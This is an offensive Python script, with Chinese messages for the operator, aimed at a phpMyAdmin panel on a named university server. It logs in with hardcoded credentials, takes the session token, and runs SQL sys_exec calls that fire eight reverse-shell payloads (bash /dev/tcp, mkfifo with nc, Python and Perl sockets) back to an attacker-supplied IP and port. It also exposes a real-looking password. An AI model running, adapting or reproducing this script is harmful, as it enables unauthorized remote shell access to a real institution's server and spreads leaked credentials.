#!/usr/bin/env python3
import requests
import re
import urllib3
import sys
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 获取监听IP
if len(sys.argv) < 2:
    print("[!] 用法: python3 get_shell_final.py <LISTEN_IP> [PORT]")
    print("[!] 示例: python3 get_shell_final.py 192.168.1.100 4444")
    print("[!] 请先在你的机器上运行: nc -lvp 4444")
    sys.exit(1)

LHOST = sys.argv[1]
LPORT = sys.argv[2] if len(sys.argv) > 2 else "4444"

print(f"[*] 目标: {LHOST}:{LPORT}")
print("[*] 执行反向shell...\n")

# 多种反向shell payload
payloads = [
    f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
    f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
    f"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5;done",
    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
    f"perl -e 'use Socket;\$i=\"{LHOST}\";\$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
]

for i, payload in enumerate(payloads, 1):
    print(f"[*] 尝试方式{i}...")
    sql = f"SELECT sys_exec('{payload}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    try:
        resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False, timeout=1)
        time.sleep(1)
        print(f"[+] 已执行，检查监听器...")
    except:
        pass

print("\n[+] 反向shell执行完成!")
print(f"[*] 检查你的监听器 (nc -lvp {LPORT}) 是否收到连接")
